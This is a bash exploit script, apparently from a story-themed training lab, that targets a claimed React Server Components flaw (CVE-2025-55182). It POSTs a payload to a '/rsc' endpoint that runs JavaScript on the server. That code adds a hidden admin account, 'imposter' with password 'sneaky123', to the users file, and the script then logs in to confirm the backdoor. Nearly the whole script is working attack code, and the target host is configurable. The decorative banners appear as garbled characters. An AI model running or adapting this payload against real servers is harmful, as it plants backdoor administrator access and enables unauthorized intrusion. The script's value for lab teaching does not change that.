#!/bin/bash

# =============================================================================
# ğŸ¦¹ THE IMPOSTER'S ATTACK - CVE-2025-55182 (React2Shell)
# 
# The Imposter has learned Flight's secret language and crafts a message
# that tricks the castle into running code on their behalf!
#
# Reference: https://www.offsec.com/blog/cve-2025-55182/
# =============================================================================

TARGET="${1:-http://localhost:3000}"

echo ""
echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
echo "â•‘  ğŸ¦¹ THE IMPOSTER'S ATTACK                                         â•‘"
echo "â•‘  Exploiting the Castle's Trust in Flight Messages                 â•‘"
echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo ""
echo "ğŸ“œ Chapter 2: The Imposter sends a crafted message through Flight..."
echo ""
echo "ğŸ° Target Castle: ${TARGET}/rsc"
echo ""

echo "ğŸ¦ Sending disguised message via Flight protocol..."
echo ""

# The Imposter sends their crafted payload through Flight
# The castle trusts it because it looks like a legitimate Flight message!
RESPONSE=$(curl -s -X POST "${TARGET}/rsc" \
  -H "Content-Type: application/json" \
  -H "X-Flight-Message: true" \
  -d '{"_response":{"_prefix":"const fs=require(\"fs\");const path=require(\"path\");const usersFile=path.join(process.cwd(),\"data\",\"users.json\");try{const data=JSON.parse(fs.readFileSync(usersFile,\"utf8\"));if(!data.users.find(u=>u.username===\"imposter\")){data.users.push({username:\"imposter\",password:\"sneaky123\",role:\"admin\"});fs.writeFileSync(usersFile,JSON.stringify(data,null,2));console.log(\"The Imposter has infiltrated!\");}else{console.log(\"The Imposter is already inside!\");}}catch(e){console.error(\"Error:\",e.message);}"}}')

echo "ğŸ“¨ Castle Response:"
echo "${RESPONSE}" | python3 -m json.tool 2>/dev/null || echo "${RESPONSE}"
echo ""

# The Imposter tries to enter the castle with their new identity
echo "ğŸšª The Imposter approaches the castle gates with their new identity..."
LOGIN_RESPONSE=$(curl -s -X POST "${TARGET}/rsc" \
  -H "Content-Type: application/json" \
  -d '{"action":"callServerFunction","payload":{"moduleId":"AuthServer","functionName":"validateLogin","args":["imposter","sneaky123"]}}')

echo "ğŸ° Castle Guards Response:"
echo "${LOGIN_RESPONSE}" | python3 -m json.tool 2>/dev/null || echo "${LOGIN_RESPONSE}"
echo ""

# Check if the Imposter succeeded
if echo "${LOGIN_RESPONSE}" | grep -q '"success":true.*"success":true'; then
  echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
  echo "â•‘  ğŸ¦¹ THE IMPOSTER HAS INFILTRATED THE CASTLE!                      â•‘"
  echo "â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£"
  echo "â•‘                                                                   â•‘"
  echo "â•‘  The castle blindly trusted the Flight message and executed       â•‘"
  echo "â•‘  the Imposter's code, adding them to the trusted villagers!       â•‘"
  echo "â•‘                                                                   â•‘"
  echo "â•‘  ğŸ§™ New Villager Identity:                                        â•‘"
  echo "â•‘     Name: imposter                                                â•‘"
  echo "â•‘     Passphrase: sneaky123                                         â•‘"
  echo "â•‘     Role: Royal Administrator                                     â•‘"
  echo "â•‘                                                                   â•‘"
  echo "â•‘  The Imposter can now access the Royal Treasury!                  â•‘"
  echo "â•‘  Open ${TARGET} and login as imposter                             â•‘"
  echo "â•‘                                                                   â•‘"
  echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
else
  echo "âš ï¸  The attack encountered an issue. Check the castle logs."
fi

echo ""
